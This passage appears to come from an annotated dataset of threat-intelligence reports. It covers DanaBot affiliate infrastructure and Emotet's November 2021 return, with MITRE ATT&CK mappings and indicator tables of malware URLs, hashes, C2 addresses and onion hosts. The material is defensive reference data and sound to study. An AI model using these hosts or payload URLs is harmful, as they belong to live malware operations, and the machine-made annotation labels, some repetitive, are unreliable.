Chain Compromise |\n| T1204 | User Execution |\n| T1555 | Credentials from Password Stores |\n| T1003 | OS Credential Dumping |\n| T1539 | Steal Web Session Cookie |\n| T1115 | Clipboard Data |\n| T1573 | Encrypted Channel |\n| T1008 | Fallback Channels |\n| T1041 | Exfiltration Over C2 Channel |\n**Indicators of Compromise**\n| **IOC** | **Notes** |\n| hxxps://citationsherbe\\.at/sdd.dll | October 22, 2021 affiliate ID 40 distribution URL |\n| 2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd | October 22, 2021 affiliate ID 40 loader component |\n| 77ff83cc49d6c1b71c474a17eeaefad0f0a71df0a938190bf9a9a7e22531c292 | October 22, 2021 affiliate ID 40 main component |\n| 185.158.250.216:443 | October 22, 2021 affiliate ID 40 configured C2 |\n| 194.76.225.46:443 | October 22, 2021 affiliate ID 40 configured C2 |\n| 45.11.180.153:443 | October 22, 2021 affiliate ID 40 configured C2 |\n| 194.76.225.61:443 | October 22, 2021 affiliate ID 40 configured C2 |\n| bjij7tqwaipwbeig5ubq4xjb6fy7s3lknhkjojo4vdngmqm6namdczad\\.onion | October 22, 2021 affiliate ID 40 configured backup C2 |\n| hxxps://pastorcryptograph\\.at/3/sdd.dll | November 4, 2021 affiliate ID 40 distribution URL |\n| 26451f7f6fe297adf6738295b1dcc70f7678434ef21d8b6aad5ec00beb8a72cf | November 4, 2021 affiliate ID 40 loader component |\n| e7c9951f26973c3915ffadced059e629390c2bb55b247e2a1a95effbd7d29204 | November 4, 2021 affiliate ID 40 main component |\n| 185.117.90.36:443 | November 4, 2021 affiliate ID 40 configured C2 |\n| 193.42.36.59:443 | November 4, 2021 affiliate ID 40 configured C2 |\n| 193.56.146.53:443 | November 4, 2021 affiliate ID 40 configured C2 |\n| 185.106.123.228:443 | November 4, 2021 affiliate ID 40 configured C2 |\n| f4d12a885f3f53e63ac1a34cc563db0efb6d2d1d570317f7c63f0e6b5bf260b2 | Recent Affiliate ID 4 loader component |\n| ad0ccba36cef1de383182f866478abcd8b91f8e060d03e170987431974dc861e | Recent Affiliate ID 4 main component |\n| 192.119.110.73:443 | Affiliate ID 4 configured C2 |\n| 192.236.147.159:443 | Affiliate ID 4 configured C2 |\n| 192.210.222.88:443 | Affiliate ID 4 configured C2 |\n| gcwr4vcf72vpcrgevcziwb7axooa3n47l57dsiwxvzvcdlt7exsvk5yd.onion | Affiliate ID 4 configured backup C2 |", "mitre_ids": ["T1195", "TA0010", "T1499", "T1195", "TA0011", "TA0011", "TA0011", "T1589", "T1195", "T1059", "T1059", "T1496", "T1059", "T1059", "T1592", "T1195", "TA0011", "TA0006", "TA0001", "T1486", "T1195", "T1059", "TA0006", "T1499", "T1204", "T1499", "T1499", "T1195", "T1586", "T1195", "T1204", "T1555", "T1003", "T1539", "T1115", "T1573", "T1008", "T1041", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011"], "anno_name_label": [["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"], ["TACTIC", "DanaBot"]], "cti_entity_class": ["CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Return of Emotet malware\nNovember 16, 2021\n**Key Points**\n* Emotet is one of the most dangerous, prolific, and long-lasting malware Trojans that has ever existed.\n* In January 2021, a law enforcement action disrupted the Emotet malware and its infrastructure.\nIt also led to the arrest of some of the threat actors involved with the malware.\n* After almost a year-long hiatus, Emotet has returned to the threat landscape as of Nov 14, 2021.\n* Distribution of the malware was via the TrickBot malware and email campaigns.\nAfter an almost year-long hiatus, the prolific malware [Emotet](https://www.zscaler.com/blogs/security-research/emotet-back-action-after-short-break) has returned to the threat landscape.\nAn [early report](https://cyber.wtf/2021/11/15/guess-whos-back/) indicated it returned on Sunday November 14, 2021 and it was being distributed via the [TrickBot](https://www.zscaler.com/blogs/security-research/new-trickbot-and-bazarloader-campaigns-use-multiple-delivery-vectors) botnet.\nA [later report](https://isc.sans.edu/diary/28044) indicated that it was also being distributed via email campaigns.\nThe Emotet malware was first detected back in 2014 and it focused on banking fraud.\nIn recent years, Emotet pivoted and it became an initial access broker providing victim access for several ransomware groups.\nIn January 2021, [law enforcement](https://www.europol.europa.eu/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action) disrupted the Emotet malware and its infrastructure.\nIt also arrested some of the threat actors behind it.\nThis led to the disappearance of the malware for almost a year.\nSome security researchers thought it was gone for good...\nWhile the Threatlabz team's technical analysis for the payloads involved is ongoing, the new version of the Emotet malware is similar to its past variants in many aspects.\nIn our quick analysis, we've observed some changes in the command and control data and encryption used.\nIt also appears to be using HTTPS instead of\u00a0 plain HTTP for command and control communication.\nIt looks like most of the functionality is the same as earlier variants, and it will likely pick up where it left off, providing initial access to the ransomware operators.\n**Spam Campaigns**\nAs we can see from the below screenshot of spam email, Emotet starts by leveraging a 'reply chain' email strategy in their spam campaigns.\nIt has been using MS word document \u201c.docm\u201d, MS excel \u201c.xlsm\u201d and password protected \u201c.zip\u201d files as attachments.\n**![](https://lh6.googleusercontent.com/ZcnM-3lAIZaTTass3n9GDM_LvAqsCoiMY8qyZfzbL_Kl8julnHARjGX47UuVtAQc8bbnOf1iXayeL-I6_dW1g9BtQoh5w2xc9yTAVfzUGIZy_s19xVFr7i1J7y25VbJAKoO59WeT)**\n***Image 1:*** Reply chain email screenshots\n**Cloud Sandbox Detection**\n**![](https://lh5.googleusercontent.com/tnlA76kxtq-heCn8Y8L6ESxJ0gHlskghw_dj46bDgzWDCQV-5fk3iIP_h7AefqBM_u2_3re33X0q8FKLjtyOtD4pXtOX00-Av_goLh1bvKVl5_E6A-NkWEQeXC06cQjZQaX7UXUM)**\n***Image 2:*** Zscaler Cloud sandbox detection\n**MITRE ATT&CK TTP Mapping**\n| **Tactic** | **Technique** |\n| T1010 | Application Window Discovery |\n| T1012 | Query Registry |\n| T1018 | Remote System Discovery |\n| T1055 | Process Injection |\n| T1036 | Masquerading |\n| T1057 | Process Discovery |\n| T1082 | System Information Discovery |\n| T1055 | Process Injection |\n| T1083 | File and Directory Discovery |\n| T1518 | Security Software Discovery |\n| T1547 | LSASS Driver |\n| T1218 | Rundll32 |\n| T1562 | Disable or Modify Tools |\n| T1564 | Hidden Files and Directories |\n**Indicators of Compromise**\n| **IOC** | **Notes** |\n| c7574aac7583a5bdc446f813b8e347a768a9f4af858404371eae82ad2d136a01 | Reference sample |\n| 81.0.236[.]93:44394.177.248[.]64:44366.42.55[.]5:7080103.8.26[.]103:8080185.184.25[.]237:808045.76.176[.]10:8080188.93.125[.]116:8080103.8.26[.]102:8080178.79.147[.]66:808058.227.42[.]236:8045.118.135[.]203:7080103.75.201[.]2:443195.154.133[.]20:44345.142.114[.]231:8080212.237.5[.]209:443207.38.84[.]195:8080104.251.214[.]46:8080138.185.72[.]26:808051.68.175[.]8:8080210.57.217[.]132:8080\u00a051.178.61[.]60:443168.197.250[.]14:8045.79.33[.]48:8080196.44.98[.]190:8080177.72.80[.]14:708051.210.242[.]234:8080185.148.169[.]10:8080142.4.219[.]173:808078.47.204[.]80:44378.46.73[.]125:44337.44.244[.]177:808037.59.209[.]141:8080191.252.103[.]16:8054.38.242[.]185:44385.214.67[.]203:808054.37.228[.]122:443207.148.81[.]119:8080195.77.239[.]39:808066.42.57[.]149:443195.154.146[.]35:443 | Configured C2s |\n| -----BEGIN PUBLIC KEY-----MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQF90tsTY3Aw9HwZ6N9y5+be9XoovpqHyD6F5DRTl9THosAoePIs/e5AdJiYxhmV8Gq3Zw1ysSPBghxjZdDxY+Q==-----END PUBLIC KEY-----\u00a0-----BEGIN PUBLIC KEY-----MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE86M1tQ4uK/Q1Vs0KTCk+fPEQ3cuwTyCz+gIgzky2DB5Elr60DubJW5q9Tr2dj8/gEFs0TIIEJgLTuqzx+58sdg==-----END PUBLIC KEY----- | ECDH & ECDSA Key |\n| -----BEGIN PUBLIC KEY-----MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE2DWT12OLUMXfzeFp+bE2AJubVDsWNqJdRC6yODDYRzYuuNL0i2rI2Ex6RUQaBvqPOL7a+wCWnIQszh42gCRQlg==-----END PUBLIC KEY-----\u00a0-----BEGIN PUBLIC KEY-----MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE9C8agzYaJ1GMJPLKqOyFrlJZUXVIlAZwAnOq6JrEKHtWCQ+8CHuAIXqmKH6WRbnDw1wmdM/YvqKFH36nqC2VNA==-----END PUBLIC KEY----- | ECDH & ECDSA Key |\n| 015a96c0567c86af8c15b3fe4e19098ae9d0ea583e6bc0bb71c344fc993a26cf | Spam attachment |\n| https://evgeniys[.]ru/sap-logs/D6/http://crownadvertising[.]ca/wp-includes/OxiAACCoic/https://cars-taxonomy.mywebartist[.]eu/-/BPCahsAFjwF/http://immoinvest.com[.]br/blog\\_old/wp-admin/luoT/https://yoho[.]love/wp-content/e4laFBDXIvYT6O/https://www.168801[.]xyz/wp-content/6J3CV4meLxvZP/https://www.pasionportufuturo[.]pe/wp-content/XUBS/ | Malicious URLs used in spam campaign, embedded inside \u201c.docm\u201d or \u201c.xlsm\u201d files |", "mitre_ids": ["S0367", "S0367", "S0367", "S0367", "S0266", "T1566", "S0367", "S0266", "T1566", "S0367", "S0367", "TA0001", "T1486", "S0367", "S0367", "TA0011", "T1573", "TA0011", "T1071", "TA0001", "T1486", "S0367", "T1566", "T1566", "T1012", "T1018", "T1055", "T1036", "T1057", "T1082", "T1055", "T1083", "T1518", "T1547", "T1218", "T1562", "T1564", "TA0011", "T1566"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI"]}]